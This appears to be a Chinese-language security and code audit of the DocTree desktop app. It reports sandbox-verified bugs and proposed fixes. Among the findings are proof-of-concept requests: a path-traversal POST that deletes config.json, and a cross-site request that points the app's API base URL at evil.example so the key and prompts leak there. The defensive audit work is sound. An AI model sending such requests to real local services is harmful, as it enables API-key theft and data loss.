# DocTree 代码通读：隐患清单与优化建议

> 版本基线：v152 / 1.0.42（2026-11-25）
> 范围：`desktop/main.cjs`、`server.mjs`、`lib/*.mjs`、`public/*.{js,html,css}` 全文通读
> 方法：静态通读 + 在**独立沙箱服务**（`DOCTREE_DATA=临时目录`、端口 4318）上实测关键结论，未触碰真实数据

---

## P0 · 立即修（已验证，会丢数据 / 丢 Key / 功能完全不可用）

### 1. 「继续生成」100% 失败：`handleResume` 引用未定义变量

`server.mjs` 的 `handleAsk` 里定义了 `webSearch`（L616）和 `addSources`（L658），
但 `handleResume`（L445–560）在 L506/508/511/514/517 直接用了这两个名字 —— 它们不在同一作用域。

实测（沙箱）：

```
POST /api/ask/resume {"docId":"…","nodeId":"n1"}
→ data: {"type":"meta",…}
→ data: {"type":"error","message":"webSearch is not defined"}
→ data: {"type":"done",…,"error":"webSearch is not defined"}
```

**影响**：点「继续」永远弹这条错误，续写功能等于不存在（不是偶发）。
**修**：在 `handleResume` 里补 `const webSearch = Boolean(body.web)` + 复制 `addSources`，并顺手 `node.status = 'streaming'`（现在不设，续写时气泡没有 streaming 样式）。

---

### 2. 路径穿越：一条 POST 就能删掉 `config.json`（含 API Key）

`lib/store.mjs` 直接把 id 拼进路径：`getDoc`/`saveDoc`/`saveTree`（L188–197、L236–243）。
而 `server.mjs` 多个接口的 `docId` / `id` 来自请求体，**没有做任何格式校验**：
`/api/doc/purge`(L327)、`/api/doc/restore`(L321)、`/api/ask`(L578)、`/api/highlights`(L399)、
`/api/instruction`(L364)、`/api/node/delete`(L423)。

实测：

```
POST /api/doc/purge {"id":"../config"}
→ 200 {"ok":true}
→ data/config.json 被删除（API Key、模型设置全没了）
```

同一手法还能让 `/api/ask` 把整棵树写进 `config.json`（`saveTree` → `trees/../config.json`）。
（`/api/doc/:id`、`/api/file/:id` 走的是正则 `[0-9a-f]+`，是安全的；**只有请求体里的 id 没校验**。）

**修**：`server.mjs` 入口统一 `const DOC_ID = /^[0-9a-f]{6,32}$/`、`GROUP_ID = /^[0-9a-f]{8}$/`，
每个用到 id 的地方先校验；`store.mjs` 里再加一道 `assertSafeId()` 兜底（`path.basename(id) === id`）。

---

### 3. CSRF：任意网页都能改你的 `baseUrl`，把 API Key 和提问内容发到攻击者服务器

本地服务没有鉴权、没有 `Origin` 校验，也不检查 `content-type`。
浏览器对跨站 `text/plain` POST 不做预检，所以恶意网页可以直接打这些接口。

实测：

```
POST /api/config
Origin: https://evil.example
Content-Type: text/plain
{"baseUrl":"https://evil.example/v1"}
→ 200，config.baseUrl 已被改成 https://evil.example/v1
```

**后果**：下一次提问时，`llm.chat` 会把 `Authorization: Bearer <你的 key>` 和提问、文档片段一起发到 evil.example。
`/api/state` 还会把 key 的前 5 后 4 位（`keyHint`）返回给这个页面（`lib/llm.mjs` L42–58）。

**修**（任选，建议两个都做）：
- 所有写操作要求自定义头 `x-doctree-client: 1`（跨站无法在不触发预检的情况下加自定义头；服务端对 OPTIONS 返回 404 即天然阻断）+ 有 `Origin` 时必须等于自身 origin；
- 或者启动时生成一次性 token，`index.html` 里注入，API 校验。

---

### 4. 非原子写 + 损坏文件静默当空树 = 整棵提问树永久丢失

- `store.saveDoc/saveTree` 直接 `writeFile` 到目标文件（L194–197、L240–243），没有 tmp+rename。
  提问时每问一次要重写整棵树（当前你最大的一棵树 256 KB），进程被杀 / 断电正好写一半的概率不低。
- `store.readTreeFile`（L62–70）把 JSON 解析失败 **静默吞成 `{nodes:{}}`**。

实测：

```
1) 把 trees/<id>.json 截断成半截 JSON（模拟写一半断电）
2) GET /api/doc/<id>  → 200，tree.nodes = 0  （看起来"树没了"）
3) POST /api/node/delete {docId, nodeId:"nope"} → 200
   树文件被写成 {"nodes":{}}   ← 原始内容彻底没了
```

也就是说：**一次崩溃 → 界面显示树空 → 用户随便点一下（删节点/再提问）→ 原文件被空树覆盖**。

**修**：
- `writeFile(tmp)` + `rename`（同盘原子）；
- `readTreeFile` 解析失败时把文件改名成 `.corrupt-<ts>` 并抛错，让上层提示"数据损坏，已备份"，并且**这次不要允许 saveTree 覆盖**；
- 顺手：`saveDoc` 同样处理（doc JSON 损坏会让该文档 500 且无法恢复）。

---

### 5. 点回答里的链接会把整个应用窗口导航走

`renderMarkdown` → `sanitizeHtml` 保留了 `<a href>`，但没有加 `target`；
`desktop/main.cjs` 只有 `setWindowOpenHandler`（L211），**没有 `will-navigate`**。

实测：

```
点击回答里的 [来源](https://example.com/paper)
窗口 URL：http://127.0.0.1:4318/  →  https://example.com/paper
```

**后果**：DocTree 界面被网页顶替，没有地址栏、没有返回；菜单里的「重新加载」只会重载那个网页。
用户只能关窗重开。而 v152 回答末尾会自动追加「来源」链接列表，所以这条几乎必然被触发。

**修**：
- `sanitizeHtml` 收尾时给所有 `a[href]` 加 `target="_blank" rel="noopener noreferrer"`（Electron 的 `setWindowOpenHandler` 就会用系统浏览器打开）；
- `main.cjs` 加 `webContents.on('will-navigate', (e, url) => { if (!url.startsWith(appOrigin)) { e.preventDefault(); shell.openExternal(url) } })`，双保险。

---

## P1 · 高价值（不致命，但影响稳定性/体验/成本）

### 6. 空 body 直接 500（`readBody(req) || '{}'` 永远不会走 `'{}'`）

`server.mjs` L298、L306、L316、L322、L328：`JSON.parse(await readBody(req) || '{}')`。
`readBody` 返回的是 `Buffer`，空 Buffer 也是 truthy → `JSON.parse('')` 抛异常。
实测：`POST /api/doc/restore` 空 body → **500**（应为 400）。
同一文件里 L162/L290/L350/L365 写的是 `.toString('utf8') || '{}'`，是正确的 —— 说明是复制粘贴漏改。
**修**：统一成 `.toString('utf8') || '{}'`，并给 `handleApi` 的解析加 try/catch 返回 400。

### 7. `/api/file/:id` 的 `accept-ranges` 是假的；文件缺失返回 500

L339–345：写死 `'accept-ranges': 'bytes'`，但完全不处理 `Range` 请求。
实测 `Range: bytes=0-9` → **200 + 完整 44 字节**（不是 206）。
pdf.js 会先探测到 `accept-ranges` 然后发 range 请求，拿到 200 后要回退，白跑一趟。
另外 `fsp.stat` 抛错会落到全局 catch → **500**（应为 404）。
**修**：要么实现 Range（10 行），要么删掉这个头；`stat` 失败返回 404。

### 8. 超时策略不合理

- 流式问答是 **120 秒墙钟超时**（`server.mjs` L649–654、L484–489）。长回答 / 慢模型会被硬截断成「请求超时」，
  而“空闲超时”（每收到一个 delta 就重置）才符合直觉。
- 非流式的 `llm.chat()`（摘要、OCR、指令）**完全没有超时**（`lib/llm.mjs` L245–281 `fetchWithRetry` 不设 signal），
  一次卡住的请求会一直挂着（摘要后台任务、导入时的 OCR 都会）。
**修**：流式改 idle-timeout；`chat()` 传 `AbortSignal.timeout(60_000)`。

### 9. `read_page` 每次都附带整页截图 → token 与费用翻倍

`server.mjs` L562–576：`execWithPageImages` 对每个 `read_page` 都 `renderPageImage` 并作为图片塞回模型。
一次回答里模型读 3 页 → 3 张整页 PNG（每张 base64 数百 KB、约 1–2k tokens），
而且这些图片会作为新的 user 消息**追加进对话历史**，多轮工具调用时上下文膨胀很快。
**修**：只有当该页文字层为空（扫描件）或模型显式请求图片时才附图；图片用较低 scale / JPEG。

### 10. 兜底轮 `max_tokens` 只有 2048

`lib/llm.mjs` L344（`streamChat` 的 OpenAI 分支）写死 2048，而工具轮（L469）和 Anthropic（L406）都是 4096。
工具轮用尽（6 轮）后会走 `streamChat` 兜底 → 长回答被截断。
**修**：统一 4096，或做成配置项。

### 11. `openDoc` 没有竞态令牌，快速连点两份文档会串页

`public/app.js` L1136：`openDoc` 是异步的，`S.doc` 是全局的，`renderPdf` 里也用 `S.doc` 取页尺寸。
两份文档的 `openDoc`/`renderPdf` 交错执行时，`#pages` 里可能出现 A 的页框 + B 的内容。
**修**：`let openSeq = 0`；进入时 `const seq = ++openSeq`，每次 await 后 `if (seq !== openSeq) return`。

### 12. `renderTree()` 全量重建，树大了会卡

L1706：`root.innerHTML = ''` 后重建所有节点，每个节点都跑 `renderMarkdown` + `sanitizeHtml` + KaTeX +
`enhanceChemBlocks`（RDKit）+ `enhanceCodeBlocks`（highlight.js）。
`meta` 和 `done` 各触发一次；21 个节点的树 ≈ 两次全量重渲染，明显掉帧（尤其带化学式时）。
**修**：增量更新——新节点 append，`done` 时只重渲染对应 `.answer`。

### 13. `closeSearch()` 漏了取消防抖定时器

L2684：`#search-input` 的 input 事件 220 ms 防抖（L3233 `searchTimer`）。
打字后立刻 Esc → 定时器仍会触发 `runSearch` → 画出搜索高亮并 `scrollIntoView`（搜索条已经关了）。
**修**：`closeSearch` 里 `clearTimeout(searchTimer)`。

### 14. `.search-hit` 浮层挡住文字选择

`public/style.css` 的 `.search-hit` 是绝对定位 div，**没有 `pointer-events: none`**。
搜到结果后想用鼠标选中那段文字，会点到高亮层而不是 textLayer。
**修**：`.search-hit { pointer-events: none; }`（本来也不需要点它）。

### 15. 化学模块：缓存无上限 + 死代码

`public/chem.js` L6–8：`let queue = []`、`let running = false` 是上一版串行队列的残留，全文件没用到。
`molCache` 是普通 Map，一个 session 里每个不同 SMILES 都留一份 SVG（几 KB~几十 KB），只增不减。
**修**：删死代码；`molCache` 加 LRU 上限（如 200 条）。

### 16. `loadBounds` 不校验屏幕范围

`desktop/main.cjs` L95–101：只检查 `width > 600 && height > 400`。
用户拔掉外接显示器 / 改分辨率后，窗口可能被恢复到屏幕外（看不见、只能改 `window.json`）。
**修**：用 `screen.getAllDisplays()` 把 x/y 夹到某个可见 display 的工作区内。

### 17. 输入框不会自动增高

`#q` 是 `rows="2"` + `max-height: 170px`，没有 JS 自增高。
写长问题时会变成框内滚动，容易看不到前面写的字。
**修**：`input` 时 `el.style.height = 'auto'; el.style.height = el.scrollHeight + 'px'`（记得夹上限）。

---

## P2 · 优化 / 加固（可排期）

18. **`/api/state` 每次全量读盘**：`store.listDocs()` 读并解析所有 doc JSON（含全文 pages）。
    当前 31 份 / 共 0.7 MB，问题不大；文档再多就要拆轻量索引（`index.json`）。
19. **`saveTree` 每问写整棵树**（当前最大 256 KB，问一次写两次）。可改成按节点分片，或 append-only 日志 + 定期压缩。
20. **`renderPageImage` 每次重新打开 PDF**（`pdf-to-img`），缓存只有 24 页；连续读页很慢。可缓存 `pdf()` 句柄。
21. **没有 CSP**：`index.html` 无 `Content-Security-Policy`。渲染层虽然过 `sanitizeHtml`，
    但加一条 `default-src 'self'; img-src 'self' data: blob:; connect-src 'self'` 是廉价加固。
22. **Electron 可再收紧**：`webPreferences` 没有 `sandbox: true`（无 preload，开了不影响功能）；
    再加上第 5 条的 `will-navigate`。
23. **`publicConfig()` 泄露 key 片段**：返回前 5 + 后 4 位（`sk-ab***1234`）。用于“我填过 key”的提示没错，
    但配合第 3 条的 CSRF 就成了信息泄露。修了 CSRF 后可保留。
24. **导入走内存**：`readBody` 默认上限 300 MB，全部 `Buffer.concat` 在内存里；前端限制 150 MB。
    超大文件会有 2× 峰值内存。可边收边写临时文件。
25. **`desktop.log` 不轮转**：每次启动 append，长期会慢慢变大（现在 40 KB）。
26. **`HOST` 环境变量**：`server.mjs` L754 允许 `HOST=0.0.0.0`，一旦这样设，
    无鉴权的 API 就暴露到局域网（第 2/3 条的破坏面会从"本机"扩到"整个局域网"）。建议只在显式 debug 时允许。

---

## 顺带确认「不是问题」的几处

- 静态文件路径穿越：`/../lib/llm.mjs`、`/%2e%2e/lib/llm.mjs` 都返回 404，`path.join` + `startsWith(PUBLIC)` 起作用了。
- XSS：`sanitizeHtml` 丢掉 `script/style/iframe/on*/javascript:`，`esc()` 覆盖了所有拼进 `innerHTML` 的用户内容，KaTeX 用默认 `trust:false`。
- SSE 分帧：`\n\n` + `data:` 前缀、`[DONE]`、Anthropic 的 `message_stop` 都处理了；断流会走 catch 存树。
- 单实例锁、固定端口、stale-server 横幅逻辑都正常。

---

## 建议修复顺序（工作量估算）

| 顺序 | 事项 | 工作量 |
|---|---|---|
| 1 | P0-2 id 校验（server 一处 + store 兜底） | 20 行 |
| 2 | P0-3 自定义头 + Origin 校验 | 20 行 |
| 3 | P0-1 resume 的 webSearch/addSources | 15 行 |
| 4 | P0-4 原子写 + 损坏不覆盖 | 30 行 |
| 5 | P0-5 链接 target=_blank + will-navigate | 15 行 |
| 6 | P1-6/7/10/13/14（都是几行） | ~30 行 |
| 7 | P1-8/9/11/12（策略与重构） | 半天 |
